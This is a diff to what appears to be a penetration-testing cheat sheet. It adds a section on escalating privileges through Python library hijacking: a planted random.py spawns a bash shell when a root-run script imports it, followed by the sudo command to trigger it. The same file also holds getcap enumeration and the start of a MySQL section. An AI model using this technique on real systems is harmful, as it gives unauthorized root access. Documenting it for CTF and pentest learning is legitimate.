@@ -69,6 +69,35 @@
     getcap -r / 2>/dev/null
     ```
 
+### PrivEsc wiht Python Library Hijacking
+
+If you have python file, and you can run it as root but the file is read-only
+
+    cat backup.py
+
+```py
+import random
+import os
+import requests
+
+''' 
+    any python code
+''''
+```
+
+Then you can create a file with the name of any library imported in the file and create a python file with its libraray name ex:
+
+    vim random.py
+
+```py
+import os
+os.system("/usr/bin/bash")
+```
+
+Then run the `backup.py` file and it will import your library and run the code inside it
+
+    sudo -u userPerm /usr/bin/python3.7 /home/userProgile/backup.py
+
 ### PrivEsc wiht MySQL
 
 1. Use ps aux and show if MySQL service run as root
